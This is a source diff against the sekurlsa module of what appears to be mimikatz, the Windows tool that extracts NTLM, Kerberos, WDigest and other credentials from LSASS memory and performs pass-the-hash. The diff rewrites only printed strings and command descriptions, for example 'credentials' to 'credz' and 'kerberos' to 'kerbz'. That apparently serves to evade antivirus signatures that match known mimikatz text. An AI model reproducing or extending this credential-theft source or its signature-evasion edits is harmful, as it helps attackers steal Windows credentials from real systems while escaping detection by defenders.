@@ -6,20 +6,20 @@
 #include "kuhl_m_sekurlsa.h"
 
 const KUHL_M_C kuhl_m_c_sekurlsa[] = {
-	{kuhl_m_sekurlsa_msv,				L"msv",				L"Lists LM & NTLM credentials"},
-	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
-	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
-	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
+	{kuhl_m_sekurlsa_msv,				L"msv",				L"shows LM & NTLM credz"},
+	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"shows WDigest credz"},
+	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"shows Kerberos credz"},
+	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"shows TsPkg credz"},
 #if !defined(_M_ARM64)
-	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
+	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"shows LiveSSP credz"},
 #endif
-	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"Lists CloudAp credentials"},
-	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
-	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
+	{kuhl_m_sekurlsa_cloudap,			L"cloudap",			L"shows CloudAp credz"},
+	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"shows SSP credz"},
+	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"shows all available providers credz"},
 
 	{kuhl_m_sekurlsa_process,			L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
-	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials"},
+	{kuhl_m_sekurlsa_sk_bootKey,		L"bootkey",			L"Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credz"},
 	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
 #if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
@@ -111,14 +111,14 @@ VOID kuhl_m_sekurlsa_reset()
 
 NTSTATUS kuhl_m_sekurlsa_process(int argc, wchar_t * argv[])
 {
-	kprintf(L"Switch to PROCESS\n");
+	kprintf(L"Switch to proc\n");
 	kuhl_m_sekurlsa_reset();
 	return STATUS_SUCCESS;
 }
 
 NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 {
-	kprintf(L"Switch to MINIDUMP : ");
+	kprintf(L"Switch to mdump : ");
 	if(argc != 1)
 		PRINT_ERROR(L"<minidumpfile.dmp> argument is missing\n");
 	else
@@ -1045,10 +1045,10 @@ VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
 		if(isRWok)
 		{
 			kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
-			kprintf(L"  \\_ msv1_0   - ");
+			kprintf(L"  \\_ msv   - ");
 			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
 			kprintf(L"\n");
-			kprintf(L"  \\_ kerberos - ");
+			kprintf(L"  \\_ kerbz - ");
 			kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
 			kprintf(L"\n");
 		}
